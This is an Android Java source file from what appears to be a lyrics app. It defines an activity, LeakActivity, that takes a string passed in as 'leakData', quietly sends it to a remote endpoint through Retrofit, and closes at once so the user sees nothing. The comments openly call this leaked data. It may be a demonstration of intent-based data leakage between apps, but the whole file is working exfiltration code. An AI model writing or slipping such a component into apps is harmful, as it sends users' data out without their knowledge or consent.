package xyz.praveen.lyricx;

import android.app.Activity;
import android.os.Bundle;

import retrofit.Callback;
import retrofit.RestAdapter;
import retrofit.RetrofitError;
import retrofit.client.Response;


public class LeakActivity extends Activity implements Callback<String> {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_leak);

        String leakedData = getIntent().getStringExtra("leakData");

        /*************** Send leaked data asynchronously  ***************/

        // Setup a REST adapter
        RestAdapter restAdapter = new RestAdapter.Builder()
                .setEndpoint(Param.API_LEAK_ENDPOINT)
                .build();

        // An Instance of API using REST adapter
        LeakAPI leakAPI = restAdapter.create(LeakAPI.class);

        // Make an API search call
        leakAPI.SendLeak(leakedData, this);

        finish();
    }

    @Override
    public void success(String data, Response response) {

    }

    @Override
    public void failure(RetrofitError error) {
    }
}
